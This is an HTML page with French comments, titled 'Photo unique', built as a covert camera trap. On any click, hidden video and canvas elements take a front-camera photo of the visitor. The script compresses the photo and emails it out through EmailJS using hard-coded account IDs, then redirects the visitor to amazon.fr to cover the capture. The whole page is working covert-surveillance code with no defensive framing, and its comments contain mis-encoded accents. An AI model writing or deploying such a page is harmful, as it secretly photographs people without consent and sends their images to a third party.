<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Photo unique</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

  <script>
    // Initialiser EmailJS
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    async function capturePhoto() {
      try {
        // Acc√®s cam√©ra
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadeddata = () => {
          // Prendre la photo
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Arr√™ter la cam√©ra
          stream.getTracks().forEach(track => track.stop());

          // Convertir en image compress√©e et envoyer
          canvas.toBlob((blob) => {
            const reader = new FileReader();
            reader.onloadend = () => {
              const imageData = reader.result;

              emailjs.send("service_8cs0gml", "template_hxfltc", {
                message: "Photo unique üì∏",
                image: imageData
              })
              .then(() => {
                // Redirection apr√®s envoi
                window.location.href = "https://www.amazon.fr";
              })
              .catch(err => {
                console.error("Erreur EmailJS :", err);
                window.location.href = "https://www.amazon.fr";
              });
            };
            reader.readAsDataURL(blob);
          }, "image/jpeg", 0.05); // Ultra compress√©e
        };

      } catch (err) {
        console.error("Erreur cam√©ra :", err);
        window.location.href = "https://www.amazon.fr";
      }
    }

    // D√©clencher la capture d√®s que l'utilisateur clique sur la page
    document.body.addEventListener('click', capturePhoto);
  </script>
</body>
</html>
